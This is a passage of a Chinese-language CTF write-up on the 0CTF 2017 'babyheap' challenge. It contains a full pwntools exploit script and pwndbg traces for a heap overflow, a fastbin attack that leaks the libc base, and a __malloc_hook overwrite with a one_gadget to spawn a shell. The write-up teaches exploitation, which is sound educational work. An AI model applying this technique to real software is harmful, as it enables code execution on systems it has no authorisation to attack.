<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">===== Baby Heap in 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure>
<p>漏洞点存在于申请chunk和填充chunk部分，我们着重对这两个地方进行分析</p>
<p><strong>Alloc chunk</strong></p>
<p>IDA中反汇编如下，这里使用了<code>calloc</code>函数，相当于<code>malloc + memset</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">alloc</span><span class="params">(__int64 heap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt;= <span class="number">15</span>; ++index )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24L</span>L * index + heap) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      v2 = input_();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1u</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24L</span>L * index + heap) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(heap + <span class="number">24L</span>L * index + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(heap + <span class="number">24L</span>L * index + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Allocate Index %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)index);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反汇编中我们可以分析heap结构体大致如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> flag;　　　　<span class="comment">//标记是否被分配</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> size;　　　　<span class="comment">//请求申请的大小</span></span><br><span class="line">    <span class="keyword">void</span>* chunk_m;　　　　  <span class="comment">//chunk的mem值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>填充chunk</strong></p>
<p>IDA反汇编如下，需要注意的是，这里并没有对填充的大小进行限制，也就意味着我们可以堆溢出控制下面的chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">fill</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = input_();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24L</span>L * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = input_();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = sub_11B2(*(_QWORD *)(<span class="number">24L</span>L * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Exploit</strong></p>
<p>这里先放exp，然后逐步进行调试讲解，我们的利用可以分为两步，第一步是泄露libc基地址，第二步是getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./0ctfbabyheap'</span>)</span><br><span class="line">elf =ELF(<span class="string">'./0ctfbabyheap'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    r.sendline(str(len(content)))</span><br><span class="line">    r.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> r.recvline()</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># fast chunk 0</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># fast chunk 1</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># fast chunk 2</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># fast chunk 3</span></span><br><span class="line">malloc(<span class="number">0x80</span>) <span class="comment"># small chunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># fastbin &lt;- chunk1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># fastbin &lt;- chunk2 &lt;- chunk1</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x58</span><span class="number">-0x399b00</span></span><br><span class="line">success(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">fake_chunk = libc_base + <span class="number">0x399acd</span></span><br><span class="line">success(<span class="string">"fake chunk:"</span>+hex(fake_chunk))</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,p64(fake_chunk)) <span class="comment"># chunk[2]-&gt;fd = fake chunk</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>) <span class="comment"># malloc fake chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake chunk</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x3f35a</span>) <span class="comment"># one_gadgets</span></span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">malloc(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>泄露libc地址</strong></p>
<p>这里我们是通过small chunk的机制泄露libc地址，当small chunk被释放之后，会进入unsorted bin中，它的fd和bk指针会指向同一个地址(unsorted bin链表的头部)，通过这个地址可以获得main_arena的地址，然后计算libc基地址，首先我们创建如下几个chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">malloc(0x10) # fast chunk 0</span><br><span class="line">malloc(0x10) # fast chunk 1</span><br><span class="line">malloc(0x10) # fast chunk 2</span><br><span class="line">malloc(0x10) # fast chunk 3</span><br><span class="line">malloc(0x80) # small chunk</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55c448092090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/20gx 0x361e77c925a0 =&gt; heap struct</span><br><span class="line">0x361e77c925a0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925b0:	0x000055c448092010	0x0000000000000001</span><br><span class="line">0x361e77c925c0:	0x0000000000000010	0x000055c448092030</span><br><span class="line">0x361e77c925d0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925e0:	0x000055c448092050	0x0000000000000001</span><br><span class="line">0x361e77c925f0:	0x0000000000000010	0x000055c448092070</span><br><span class="line">0x361e77c92600:	0x0000000000000001	0x0000000000000080</span><br><span class="line">0x361e77c92610:	0x000055c448092090	0x0000000000000000</span><br><span class="line">0x361e77c92620:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c92630:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>释放两个fast chunk，将第二个指向第一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021 =&gt; 0</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021 =&gt; 1 free</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021 =&gt; 2 free</span><br><span class="line">0x55c448092050:	0x000055c448092020	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021 =&gt; 3</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000091 =&gt; 4</span><br><span class="line">0x55c448092090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x55c448092040 —▸ 0x55c448092020 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/20gx 0x361e77c925a0</span><br><span class="line">0x361e77c925a0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925b0:	0x000055c448092010	0x0000000000000000</span><br><span class="line">0x361e77c925c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c925d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c925e0:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x361e77c925f0:	0x0000000000000010	0x000055c448092070</span><br><span class="line">0x361e77c92600:	0x0000000000000001	0x0000000000000080</span><br><span class="line">0x361e77c92610:	0x000055c448092090	0x0000000000000000</span><br><span class="line">0x361e77c92620:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c92630:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>这里我们通过 fill 函数修改第0个chunk之后的内容，因为没有限制，所以我们可以修改到2处的指针，让其指向chunk4，因为chunk4是small bin，被链入到了fast bin中会有size的检查，所以我们这里需要将chunk4处的size改为0x20过size的检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">fill(0,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80))</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021 free</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021 free</span><br><span class="line">0x55c448092050:	0x000055c448092080	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55c448092090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">code:</span><br><span class="line">fill(3,p64(0)*3+p64(0x21))</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092050:	0x000055c448092080	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x55c448092040 —▸ 0x55c448092080 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>然后我们申请这两个地方的fastbin就可以让index 2的堆块的地址和index 4堆块的地址一样，等index 4被free后，这里就是fd 字段，之后便能通过dump index 2来泄漏index 4的fd内容，括号中括起来的即是heap结构体中指向的同一地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">malloc(0x10)</span><br><span class="line">malloc(0x10)</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x361e77c925a0</span><br><span class="line">0x361e77c925a0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925b0:	0x000055c448092010	0x0000000000000001</span><br><span class="line">0x361e77c925c0:	0x0000000000000010	0x000055c448092050</span><br><span class="line">0x361e77c925d0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925e0:	(0x000055c448092090)	0x0000000000000001</span><br><span class="line">0x361e77c925f0:	0x0000000000000010	0x000055c448092070</span><br><span class="line">0x361e77c92600:	0x0000000000000001	0x0000000000000080</span><br><span class="line">0x361e77c92610:	(0x000055c448092090)	0x0000000000000000</span><br><span class="line">0x361e77c92620:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c92630:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们再将其改为原来的大小，申请释放即可泄露出fd指向的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">fill(3,p64(0)*3+p64(0x91))</span><br><span class="line">malloc(0x80)</span><br><span class="line">free(4)</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55c448092090:	0x00007f9c3ed6db58	0x00007f9c3ed6db58</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55c448092080 —▸ 0x7f9c3ed6db58 (main_arena+88) ◂— 0x55c448092080</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>这个地址是<code>main_arena+88</code>，我们将其减去0x58得到main_arena的地址，然后根据自己系统libc版本减去相应的偏移获得libc的基地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x58-0x399b00</span><br><span class="line">success(&quot;libc_base: &quot;+hex(libc_base))</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">[...]</span><br><span class="line">    0x7f9c3e9d4000     0x7f9c3eb69000 r-xp   195000 0      /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; p/x 0x7f9c3ed6db00-0x7f9c3e9d4000</span><br><span class="line">$2 = 0x399b00</span><br></pre></td></tr></table></figure>
<p><strong>getshell</strong></p>
<p>我们这里考虑的是使用malloc_hook函数来getshell，当调用 malloc 时，如果 malloc_hook 不为空则调用指向的这个函数，所以这里我们传入一个 one-gadget 即可，首先我们需要找到一个fake chunk，我们将其申请到然后将 one-gadget 写入，它的size选择在0x10~0x80之间即可，这里选择的是mallc_hook上面一排的地方，为了使我们的user data刚好能够写到malloc_hook的位置</p>
